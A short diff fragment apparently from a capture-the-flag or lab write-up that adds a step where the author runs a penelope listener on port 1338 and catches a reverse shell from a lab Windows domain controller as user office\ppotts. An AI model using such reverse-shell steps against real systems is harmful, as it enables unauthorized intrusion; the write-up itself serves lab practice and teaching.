@@ -762,3 +762,19 @@ Mode                 LastWriteTime         Length Name
 PS C:\xampp\htdocs\internal\applications> 
 ```
 Now the file is there
+
+```python
+penelope -p 1338           
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.32.165 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 office\ppotts 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.32.165-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_05_12-20_50_52-602.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Program Files\LibreOffice 5\program> whoami
+office\ppotts
+PS C:\Program Files\LibreOffice 5\program>
+```
+Now i have a shell as this user!
+
